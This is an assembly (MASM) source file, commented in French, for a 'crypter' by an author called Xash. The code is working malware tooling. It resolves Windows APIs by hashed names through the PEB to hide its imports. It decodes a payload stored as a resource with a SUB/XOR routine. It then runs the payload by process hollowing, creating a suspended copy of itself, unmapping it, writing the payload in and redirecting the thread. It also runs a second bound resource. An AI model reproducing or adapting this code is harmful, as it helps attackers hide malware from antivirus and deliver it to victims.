;---------------------------------------------------------
; Projet: MASM Crypter
; Description: Un crypter qui stocke dans les ressources
;              puis utilise un RunPE, écrit avec MASM
; Auteur: Xash
;---------------------------------------------------------

.386
.model flat, stdcall
option casemap:none
assume fs:nothing
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
includelib \masm32\lib\kernel32.lib

.data

	; API Kernel32 {
		dwHashGetProcAddress dword 797455A8h
		dwHashGetModuleHandleA dword 64717A77h
		dwHashGetModuleFileNameA dword 46673FD8h 
		;---
		dwHashFindResourceA dword 1EB5361Ah
		dwHashSizeofResource dword 51CC8DE6h
		dwHashLoadResource dword 5276BC34h
		dwHashLockResource dword 75B52779h
		;---
		dwHashCreateProcessA dword 4ACB04EEh
		dwHashGetThreadContext dword 5D74E3AFh
		dwHashVirtualAllocEx dword 07A9825Dh
		dwHashVirtualAlloc dword 1BFA950Ah
		dwHashWriteProcessMemory dword 6D7C2DD1h
		;---
		dwHashSetThreadContext dword 01CE0A23h
		dwHashResumeThread dword 384680B7h
		
		byte 0CCh ; Séparation pour le chargement des API
		
		dwGetProcAddress dword 0
		dwGetModuleHandleA dword 0
		dwGetModuleFileNameA dword 0
		;---
		dwFindResourceA dword 0
		dwSizeofResource dword 0
		dwLoadResource dword 0
		dwLockResource dword 0
		;---
		dwCreateProcessA dword 0
		dwGetThreadContext dword 0
		dwVirtualAllocEx dword 0
		dwVirtualAlloc dword 0
		dwWriteProcessMemory dword 0
		;---
		dwSetThreadContext dword 0
		dwResumeThread dword 0
	;}
	
	; API Ntdll {
		dwHashRtlZeroMemory dword 360231B3h 
		dwHashNtUnmapViewOfSection dword 11DFBD0Ch
		
		byte 0CCh ; Séparation pour le chargement des API
		
		dwRtlZeroMemory dword 0
		dwNtUnmapViewOfSection dword 0
	;}
	
	szCurrentPath byte 128 dup(?)
	
.data?

	; Pour l'execution en mémoire
	startInfo STARTUPINFOA <>
	procInfo PROCESS_INFORMATION <>
	ctx CONTEXT <>

.code

BKDRHash proc ; param: EDI
	local seed:dword
	mov seed, 1Fh
	xor eax, eax
	push edx
	push ecx
	xor ecx, ecx
	
	next:
		mul seed ; eax *= seed
		add al, byte ptr[edi + ecx]
		inc ecx
		cmp byte ptr[edi + ecx], 0
	jne next
	
	end_:
	and eax, 7FFFFFFFh
	pop ecx
	pop edx
	
	ret
BKDRHash endp

GetNtdllAddr proc
	mov eax, fs:[30h]   	; PEB
	mov eax, [eax + 0Ch]    ; PEB->Ldr
	mov eax, [eax + 14h]    ; PEB->Ldr.InMemoryOrderModuleList.Flink (1ére entrée)
	mov eax, [eax]          ; 2nd entrée (ntdll.dll)
	mov eax, [eax + 10h]    ; Adresse de base de la 2nd entrée
	
	ret
GetNtdllAddr endp

Program proc
	; ------------------------------------
	; 		   Variables locales
	; ------------------------------------

	local dwKernel:dword
	local dwPEHeader:dword
	local dwFunctions:dword
	local dwNames:dword
	local dwNameOrdinals:dword
	
	local dwExe:dword
	local dwResource:dword
	local dwResSize:dword
	local dwAddrRes:dword
	
	local dwProcBase:dword
	local wNbSections:dword
	local dwOEP:dword
	
	local szNameRes:word
	local szNameBindRes:word
	mov szNameRes, 0031h
	mov szNameBindRes, 0032h
	
	; ------------------------------------
	; 		   Recherche des API
	; ------------------------------------
	
	xor eax, eax            
	mov eax, fs:[30h]   	; PEB
	mov eax, [eax + 0Ch]    ; PEB->Ldr
	mov eax, [eax + 14h]    ; PEB->Ldr.InMemoryOrderModuleList.Flink (1ére entrée)
	mov eax, [eax]          ; 2nd entrée (ntdll.dll)
	mov eax, [eax]          ; 3éme entrée (kernel32.dll)
	mov eax, [eax + 10h]    ; Adresse de base de la 3éme entrée
	mov esi, offset dwHashGetProcAddress ; ESI contient l'adresse du hash de GetProcAddress
	mov edi, offset dwGetProcAddress
	
	searchDll:
	mov ecx, eax					; ECX contient maintenant l'adresse de kernel32.dll
	push ecx
	mov ecx, dword ptr[ecx + 3Ch] 	; A 3C se trouve e_lfanew
	add ecx, eax 					; ECX contient l'adresse absolue du PE Header
	cmp word ptr[ecx], 'EP'			; On est bien au bon endroit ?
	jne endExe
	mov dword ptr[dwPEHeader], ecx		
	mov dword ptr[dwKernel], eax
	
	mov edx, ecx					; EDX contient maintenant un pointer sur le PE Header
	mov edx, dword ptr[edx + 78h]	; EDX = RVA de l'EAT
	add edx, eax					; On en fait une adresse absolue
	
	mov ebx, dword ptr[edx + 1Ch]	; RVA de la table des fonctions
	add ebx, eax
	mov dword ptr[dwFunctions], ebx ; VA
	mov ebx, dword ptr[edx + 20h]	; RVA de la table des noms
	add ebx, eax
	mov dword ptr[dwNames], ebx ; VA
	mov ebx, dword ptr[edx + 24h]	; RVA de la table des ordinals
	add ebx, eax
	mov dword ptr[dwNameOrdinals], ebx ; VA
	
	pop ecx ; On récupére l'adresse de la dll
	
	loadAPI:
		mov edx, dword ptr[dwNames] ; EDX contient la VA table des noms
		sub edx, sizeof dword
		push edi
		searchFunction:
			add edx, sizeof dword
			mov edi, ecx			; EDI contient l'adresse de kernel32
			add edi, dword ptr[edx] ; VA du nom de la fonction
			call BKDRHash
			cmp eax, dword ptr[esi]
		jne searchFunction
		pop edi
		
		; On a trouvé l'emplacement dans la table des noms
		push ecx						; On sauvegarde l'adresse de la dll
		sub edx, dword ptr[dwNames] 	; On obtient l'entré relatif au début du tableau
		shr edx, 2							; EDX = EDX / 4
		mov ecx, edx
		shl ecx, 1 						; ECX = ECX * 2
		mov eax, dword ptr[dwNameOrdinals]
		add ecx, eax					; On est à l'adresse de l'ordinal (VA)
		xor eax, eax
		mov ax, word ptr[ecx]			; EAX = l'ordinal pour pouvoir aller chercher dans la table des fonctions
		shl eax, 2 						; EAX = EAX * 4
		add eax, dword ptr[dwFunctions] ; On ajoute l'adresse de la table des fonctions (VA)
		mov eax, dword ptr[eax] 		; EAX contient l'adresse de GetProcAddress (RVA)
		mov ebx, dword ptr[dwKernel]
		add eax, ebx					; (VA)
		mov dword ptr[edi], eax
		pop ecx
		
		add esi, sizeof dword
		add edi, sizeof dword
		cmp byte ptr[esi], 0CCh			; Fin de la liste des API
	jne loadAPI
	
	; On passe à NTDLL
	cmp dword ptr[dwRtlZeroMemory], 0		; Si on a pas déjà chargé NTDLL
	jne NtdllLoaded
	
	call GetNtdllAddr
	mov esi, offset dwHashRtlZeroMemory
	mov edi, offset dwRtlZeroMemory
	jmp searchDll
	
	NtdllLoaded:
	
	; ------------------------------------
	; 	  Chargement de la ressource
	; ------------------------------------
	
	; Addresse de l'executable
	push 0
	call dword ptr[dwGetModuleHandleA]
	mov dword ptr[dwExe], eax
	
	; On va chercher notre ressource
	lea eax, szNameRes
	searchRes:
	push RT_RCDATA	
	push eax
	push dword ptr[dwExe]
	call dword ptr[dwFindResourceA]
	mov dword ptr[dwResource], eax
	
	cmp eax, 0
	je endExe
	
	; Maintenant, il nous faut la taille de notre ressource
	push dword ptr[dwResource]
	push dword ptr[dwExe]
	call dword ptr[dwSizeofResource]
	mov dword ptr[dwResSize], eax
	
	; On récupére son adresse
	push dword ptr[dwResource]
	push dword ptr[dwExe]
	call dword ptr[dwLoadResource]
	
	push eax
	call dword ptr[dwLockResource]
	mov dword ptr[dwAddrRes], eax
	
	; ------------------------------------
	; 		 Déchiffrement du fichier
	; ------------------------------------
	
	push PAGE_EXECUTE_READWRITE
	push MEM_COMMIT + MEM_RESERVE
	push dword ptr[dwResSize]
	push dword ptr[dwAddrRes]
	call dword ptr[dwVirtualAlloc]
	
	mov ecx, dword ptr[dwAddrRes]
	add ecx, dword ptr[dwResSize]
	
	UnXOR:
		dec ecx
		sub byte ptr[ecx], 65d	
		xor byte ptr[ecx], 65d	
	cmp ecx, dword ptr[dwAddrRes]
	jne UnXOR
	
	; ------------------------------------
	; 		  Lancement en mémoire
	; ------------------------------------
	
	; On créé un processus avec notre propre fichier
	lea eax, dword ptr[procInfo] 
	lea ebx, dword ptr[startInfo]
	
	push sizeof PROCESS_INFORMATION
	push eax
	call dword ptr[dwRtlZeroMemory]
	push sizeof STARTUPINFOA
	push ebx
	call dword ptr[dwRtlZeroMemory]
	
	; On va récupérer le chemin du fichier courant
	push 128d
	push offset szCurrentPath
	push 0
	call dwGetModuleFileNameA
	
	lea eax, procInfo 			; La fonction a écraser EAX
	push eax
	push ebx
	push 0
	push 0
	push CREATE_SUSPENDED
	push 0
	push 0
	push 0
	push 0
	push offset szCurrentPath
	call dword ptr[dwCreateProcessA]

	; On récupére son CONTEXT pour accéder à ses registres
	lea ecx, dword ptr[ctx]
	push sizeof CONTEXT
	push ecx
	call dword ptr[dwRtlZeroMemory]
	
	mov dword ptr[ctx.ContextFlags], CONTEXT_INTEGER
	lea ecx, dword ptr[ctx]				; ECX est modifié
	
	push ecx
	push dword ptr[procInfo.hThread]
	call dword ptr[dwGetThreadContext]
	
	; On démappe les sections du processus, on a juste besoin de sa structure
	push dword ptr[dwExe]
	push dword ptr[procInfo.hProcess]
	call dword ptr[dwNtUnmapViewOfSection]
	
	; On se réserve de la zone mémoire
	mov edi, dword ptr[dwAddrRes]
	add edi, dword ptr[edi + 3Ch]		; On saute à son PE Header 
			
	push PAGE_EXECUTE_READWRITE
	push MEM_COMMIT + MEM_RESERVE
	push dword ptr[edi + 50h]			; SizeOfImage
	push dword ptr[edi + 34h]			; ImageBase
	push dword ptr[procInfo.hProcess]
	call dword ptr[dwVirtualAllocEx]
		
	mov dword ptr[dwProcBase], eax
	
	; On a notre petite place, on peux écrire le header de notre programme
	push 0
	push dword ptr[edi + 54h]			; SizeOfHeaders
	push dword ptr[dwAddrRes]
	push dword ptr[dwProcBase]
	push dword ptr[procInfo.hProcess]
	call dword ptr[dwWriteProcessMemory]
	
	; On récupére quelques valeurs
	xor ecx, ecx
	mov cx, word ptr[edi + 06h]			; NumberOfSections
	mov word ptr[wNbSections], cx
	
	mov ecx, dword ptr[edi + 28h] 		; AddressOfEntryPoint (RVA)
	mov dword ptr[dwOEP], ecx
	
	; On écris les sections dans la mémoire
	xor ecx, ecx
	add edi, sizeof IMAGE_NT_HEADERS
	mov esi, dword ptr[dwAddrRes] 
	
	; EDI => VA de la table des sections
	; ESI => VA du fichier en ressource
	loopSection:
		push ecx							; On sauvegarde notre compteur
		mov eax, dword ptr[edi + 0Ch]		; VirtualAddress (RVA)
		add eax, dword ptr[dwProcBase] 
		mov ebx, dword ptr[edi + 10h]		; SizeOfRawData 
		mov edx, dword ptr[edi + 14h]		; PointerToRawData (RVA)
		add edx, dword ptr[dwAddrRes] 
		
		push 0
		push ebx							; SizeOfRawData
		push edx							; PointerToRawData (VA) 
		push eax							; VirtualAddress (VA)
		push dword ptr[procInfo.hProcess]
		call dword ptr[dwWriteProcessMemory]
			
	add edi, sizeof IMAGE_SECTION_HEADER
	pop ecx
	inc ecx
	cmp cx, word ptr[wNbSections]		; Tant que on a pas fait toutes les sections
	jne loopSection
	
	; On change son point d'entrée
	mov eax, dword ptr[dwOEP] 		; AddressOfEntryPoint (RVA)
	add eax, dword ptr[dwProcBase] 	; VA
	mov dword ptr[ctx.regEax], eax
		
	; On applique le changement de registre
	lea ebx, dword ptr[ctx]
	push ebx 
	push dword ptr[procInfo.hThread]
	call dword ptr[dwSetThreadContext]

	; On lance le thread
	push dword ptr[procInfo.hThread]
	call dword ptr[dwResumeThread]
	
	; On lance le binder
	lea eax, szNameBindRes
	jmp searchRes
	
	endExe:
		ret
Program endp

start:
	call Program
	
	invoke ExitProcess, 0
end start